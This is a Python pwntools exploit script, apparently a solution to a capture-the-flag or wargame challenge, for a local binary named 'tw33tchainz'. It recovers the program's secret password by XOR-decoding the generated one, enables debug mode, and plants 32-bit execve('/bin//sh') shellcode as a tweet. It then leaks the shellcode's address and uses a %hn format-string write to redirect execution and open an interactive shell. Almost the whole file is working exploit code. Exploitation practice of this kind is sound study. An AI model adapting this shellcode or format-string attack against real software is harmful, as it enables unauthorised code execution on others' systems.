import pwn
import time
import re
# generated_pass = "192f7e79a48950390140532316efede9"

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73"\
            b"\x68\x68\x2f\x62\x69\x6e\x89"\
            b"\xe3\x89\xc1\x89\xc2\xb0\x0b"\
            b"\xcd\x80\x31\xc0\x40\xcd\x80"


def create_format_string(value_to_write, offset=1):
    shell_string = ""
    if type(value_to_write) == int:
        value_to_write = hex(value_to_write)

    if value_to_write[:2] == "0x":
        value_to_write = value_to_write[2:]
        remainder = (len(value_to_write) % 4)
        if remainder > 0:
            value_to_write = ("0" * (4 - remainder)) + value_to_write

    low_order_bytes = 0
    high_order_bytes = 0
    if len(value_to_write) == 8:
        low_order_bytes = int(value_to_write[4:], 16)
        high_order_bytes = int(value_to_write[:4], 16)
    elif len(value_to_write) == 4:
        low_order_bytes = int(value_to_write, 16)
        high_order_bytes = 0

    if ((low_order_bytes < high_order_bytes) or (low_order_bytes == high_order_bytes)) \
            and len(value_to_write) == 8:
        format_string = "%.{:d}x%{:d}\\$hn%.{:d}x%{:d}\\$hn".format(
            low_order_bytes - 8,
            offset + 1,
            high_order_bytes - low_order_bytes,
            offset)
        shell_string = "{:s}{:s}".format(shell_string, format_string)
    elif (low_order_bytes > high_order_bytes) and len(value_to_write) == 8:
        format_string = "%.{:d}x%{:d}\\$hn%.{:d}x%{:d}\\$hn".format(
            high_order_bytes - 8,
            offset,
            low_order_bytes - high_order_bytes,
            offset + 1)
        shell_string = "{:s}{:s}".format(shell_string, format_string)

    if len(value_to_write) == 4:
        shell_string = shell_string + "%.{:d}x%{:d}\\$hn".format(
            low_order_bytes - 4,
            offset)

    return shell_string


def batch(iterable, n=1):
    l = len(iterable)
    for ndx in range(0, l, n):
        yield iterable[ndx:min(ndx + n, l)]


def get_secret_pass(generated_pass):
    byte_arr_pass = bytearray.fromhex(generated_pass)
    secret_pass = pwn.xor(byte_arr_pass, 0x44)
    secret_pass = [i - 0x44 for i in secret_pass]
    secret_pass = [i if i >= 0 else (256 - abs(i)) for i in secret_pass]
    secret_pass = "".join(["{:#04x}".format(i)[2:] for i in secret_pass])
    # The last byte should be xord by the standar C line ending
    # character, 0x00. Because the generated pass is
    # just the raw memory dump the order is already little endian, so it will be the
    # 13th byte rather than the 16th byte.
    secret_pass = secret_pass[:24] + generated_pass[24:26] + secret_pass[26:]
    secret_pass = bytearray.fromhex(secret_pass)
    secret_pass = bytes(secret_pass)
    # order of bytes needs to be chenged to the non- little endian representation
    # so that they match when compared in memory
    secret_pass = b''.join([i[::-1] for i in batch(secret_pass, 4)])
    return secret_pass


def recv_all_if_exists(p):
    if p.can_recv() is False:
        return b''
    data = b''
    while p.can_recv() is True:
        data += p.read()
    return data


def tweet(tweet_data, p):
    print(f"Tweeting: {tweet_data.decode('ISO-8859-1')}")
    time.sleep(sleep_time)
    p.send_raw(b'1\n')
    time.sleep(sleep_time)
    out = recv_all_if_exists(p)
    print(out.decode("ISO-8859-1"))
    p.send_raw(tweet_data + b'\n')
    time.sleep(sleep_time)
    out = recv_all_if_exists(p)
    print(out.decode("ISO-8859-1"))

    p.send_raw(b'\n')
    time.sleep(sleep_time)
    out = recv_all_if_exists(p)
    print(out.decode("ISO-8859-1"))
    return out


sleep_time = 0.25

p = pwn.tubes.process.process(["./tw33tchainz"], shell=True)
p.readuntil("Enter Username:")
username = b"D"*31
p.send_raw(username)
p.readuntil("Generated Password:\n")
generated_pass = p.readline().decode().replace("\n", "")
secret = get_secret_pass(generated_pass)

# if p.can_recv() is True:
authenticated = False
while not authenticated:
    p.send_raw(b'3\n')
    time.sleep(sleep_time)
    out = recv_all_if_exists(p)
    time.sleep(sleep_time)
    p.send_raw(secret)
    time.sleep(sleep_time)
    out = recv_all_if_exists(p)
    # print(out.decode())
    if out == b'Authenticated!\n':
        authenticated = True
    p.send_raw(b'\n\n\n')
    time.sleep(sleep_time)

# turn debug mode on
p.send_raw(b'6\n')
time.sleep(sleep_time)
p.send_raw(b'6\n')
time.sleep(sleep_time)
out = recv_all_if_exists(p)
print(out.decode("ISO-8859-1"))

# Data input

tweet(shellcode, p)

p.send_raw(b'\n')
# View tweet chain
p.send_raw(b'2\n')
time.sleep(sleep_time)
p.send_raw(b'2\n')
time.sleep(sleep_time)
out = recv_all_if_exists(p)
address_match = re.search("(?<=Address: )(0x[0-9a-f]{8})", out.decode("ISO-8859-1"))
if address_match is None:
    print("No address found")

address = address_match.groups()[0]
address_val = int(address, 16)

p.send_raw(b'\n')
time.sleep(sleep_time)
out = recv_all_if_exists(p)
print(out.decode("ISO-8859-1"))

format_string = create_format_string(address_val, offset=1).encode()

# format_string = r'%.2044x%1\$hn%.33820x%2\$hn'.encode()
# tweet(pwn.p32(0x8048c20) + format_string, p)
# tweet(pwn.p32(address_val)*4, p)
tweet(pwn.p32(address_val + 2) + pwn.p32(address_val) + format_string, p)

# tweet(pwn.p32(0x08048c20) + b"%08x.%08x.%08x", p)
time.sleep(sleep_time)
p.send_raw(b'\n')
time.sleep(sleep_time)
out = recv_all_if_exists(p)
print(out.decode("ISO-8859-1"))

p.send_raw(b'2\n')
time.sleep(sleep_time)
p.send_raw(b'2\n')
time.sleep(sleep_time)
out = recv_all_if_exists(p)
print(out.decode("ISO-8859-1"))

p.interactive()
